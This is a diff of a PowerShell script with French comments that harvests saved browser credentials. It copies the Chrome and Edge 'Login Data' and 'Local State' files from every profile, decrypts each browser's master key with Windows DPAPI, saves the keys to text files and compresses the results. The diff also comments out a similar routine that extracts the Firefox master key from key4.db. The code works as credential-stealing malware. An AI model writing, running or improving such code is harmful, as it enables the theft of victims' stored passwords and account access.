@@ -52,7 +52,7 @@ catch {
 # Récupère les informations de connexion pour le profil par défaut
 Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination "$DestinationPath\google\LoginData_0"
 Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination "$DestinationPath\google\LocalState"
-New-Item -Path "$DestinationPath\google\decrypted_key.txt" -ItemType File -Value $decryptedKeyBase64
+New-Item -Path "$DestinationPath\google\decrypted_key_google.txt" -ItemType File -Value $decryptedKeyBase64
 
 # Récupère les informations de connexion pour chaque profil "Profile*"
 $profiles = Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data" -Directory | Where-Object { $_.Name -like "Profile*" }
@@ -67,8 +67,12 @@ foreach ($profile in $profiles) {
 
 # Récupération des mots de passe Microsoft Edge
 Add-Type -AssemblyName System.Security
-$localStatePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
-$jsonData = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json
+$localStatePath_edge = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
+write-host $localStatePath_edge
+$content = Get-Content -Path $localStatePath_edge -Raw UTF8
+Write-Host "Contenu du fichier :" $content
+
+$jsonData = Get-Content -Path $localStatePath_edge -Raw | ConvertFrom-Json
 $encryptedKeyBase64 = $jsonData.os_crypt.encrypted_key
 $encryptedKey = [System.Convert]::FromBase64String($encryptedKeyBase64)
 $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
@@ -84,7 +88,7 @@ catch {
 # Récupère les informations de connexion pour le profil par défaut
 Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" -Destination "$DestinationPath\edge\LoginData_0"
 Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destination "$DestinationPath\edge\LocalState"
-New-Item -Path "$DestinationPath\edge\decrypted_key.txt" -ItemType File -Value $decryptedKeyBase64
+New-Item -Path "$DestinationPath\edge\decrypted_key_edge.txt" -ItemType File -Value $decryptedKeyBase64
 
 # Récupère les informations de connexion pour chaque profil "Profile*"
 $profiles = Get-ChildItem -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data" -Directory | Where-Object { $_.Name -like "Profile*" }
@@ -97,35 +101,38 @@ foreach ($profile in $profiles) {
     }
 }
 
-# Fonction pour obtenir la clé maître avec DPAPI
-function Get-MasterKey {
-    param (
-        [string]$keyDbPath,
-        [int]$iteration
-    )
-    try {
-        $keyData = [System.IO.File]::ReadAllBytes($keyDbPath)
-        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($keyData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-        $masterKeyBase64 = [Convert]::ToBase64String($masterKey)
-        New-Item -Path "$DestinationPath\firefo\decrypted_key.txt" -ItemType File -Value $masterKeyBase64
-    }
-    catch {
-        Write-Output "Erreur lors de la récupération de la clé firefox : $_"
-    }
-}
 
 
-# lister tous les profils firefox
-$profiles = Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory
-$i = 1
-foreach ($profile in $profiles) {
-    $path = "$env:APPDATA\Mozilla\Firefox\Profiles\$($profile.Name)\key4.db"
-    if (Test-Path $path) {
-        $keyDbPath = $path
-        Get-MasterKey -keyDbPath $keyDbPath -iteration $i
-        $i++
-    }
-}
+# # Fonction pour obtenir la clé maître avec DPAPI
+# function Get-MasterKey {
+#     param (
+#         [string]$keyDbPath,
+#         [int]$iteration
+#     )
+#     try {
+#         $keyData = [System.IO.File]::ReadAllBytes($keyDbPath)
+#         $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($keyData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+#         $masterKeyBase64 = [Convert]::ToBase64String($masterKey)
+#         New-Item -Path "$DestinationPath\firefo\decrypted_key.txt" -ItemType File -Value $masterKeyBase64
+#     }
+#     catch {
+#         Write-Output "Erreur lors de la récupération de la clé firefox : $_"
+#     }
+# }
+
+
+# # lister tous les profils firefox
+# $profiles = Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory
+# $i = 1
+# foreach ($profile in $profiles) {
+#     $path = "$env:APPDATA\Mozilla\Firefox\Profiles\$($profile.Name)\key4.db"
+#     if (Test-Path $path) {
+#         $keyDbPath = $path
+#         Get-MasterKey -keyDbPath $keyDbPath -iteration $i
+#         $i++
+#     }
+# }
+
 
 
 # Compresse le dossier contenant les données
